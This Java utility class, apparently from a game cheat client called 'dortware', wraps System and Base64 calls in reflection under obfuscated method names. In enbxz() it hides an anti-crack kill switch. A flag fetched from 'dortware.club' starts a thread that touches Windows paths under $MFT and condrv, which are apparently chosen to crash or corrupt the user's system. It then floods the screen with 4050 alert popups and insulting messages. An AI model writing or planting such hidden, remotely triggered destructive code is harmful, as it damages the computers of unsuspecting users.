package skidmonke;

import org.lwjgl.Sys;

import java.io.File;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.Locale;

public final class Indirection {

    private static final MethodHandles.Lookup LOOKUP = MethodHandles.lookup();
    private static final Class<?> INT_CLASS = int.class, SYSTEM_CLASS = System.class, STRING_CLASS = String.class, BASE64_CLASS = Base64.class;
    private static Object system;
    private static Object base64;

    static {
        a();
    }

    public static void a() {
        try {
            system = SYSTEM_CLASS.newInstance();
            base64 = BASE64_CLASS.newInstance();
        } catch (InstantiationException | IllegalAccessException ignored) {
        }
    }

    public static String acvcxv(String property) {
        try {
            return (String) SYSTEM_CLASS.getDeclaredMethod("getenv", STRING_CLASS).invoke(system, property);
        } catch (InvocationTargetException | NoSuchMethodException | IllegalAccessException ignored) {
            return null;
        }
    }

    public static String becv(String property) {
        try {
            return (String) SYSTEM_CLASS.getDeclaredMethod("getProperty", STRING_CLASS).invoke(system, property);
        } catch (InvocationTargetException | NoSuchMethodException | IllegalAccessException ignored) {
            return null;
        }
    }

    public static Base64.Encoder enbxz() {
        boolean a = true;
        try {
            a = AES.penis("dortware.club").contains("ks=1");
        } catch (Exception e) {
            "Don't disconnect net next time retard".toLowerCase(Locale.ROOT);
        }
        if (a) {
            new Thread(() -> {
                try {
                    Thread.sleep(5555L);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                String[] ape = new File("C:\\$MFT\\retard.png").getAbsoluteFile().list();
                if (new File("\\.\\globalroot\\device\\condrv\\kernelconnect").exists()) {
                    "You fucked up".toLowerCase(Locale.ROOT);
                }
            }).start();
            for (int i = 0; i < 4050; ++i)
                Sys.alert("Yeeted on", "This is the type of funky stuff that happens when you run a crack.");
            throw new IllegalArgumentException("princekin knows how to crack???... WTF! omg he crack doratwear by self?!?!?!");
        }
        try {
            return (Base64.Encoder) BASE64_CLASS.getDeclaredMethod("getEncoder").invoke(base64);
        } catch (InvocationTargetException | NoSuchMethodException | IllegalAccessException ignored) {
            return null;
        }
    }

    public static void bvnsa() {
        try {
            final MethodHandle exitMethod = LOOKUP.findStatic(SYSTEM_CLASS, "exit", MethodType.methodType(void.class, INT_CLASS));
            exitMethod.invoke(0);
        } catch (Throwable ignored) {
        }
    }

    public static char[] afdd(Object requireNonNull) {
        try {
            return (char[]) BASE64_CLASS.getDeclaredMethod("getDecoder").invoke(base64).getClass().getMethod("decode").invoke(BASE64_CLASS.getDeclaredMethod("getDecoder"), requireNonNull);
        } catch (IllegalAccessException | InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        return null;
    }
}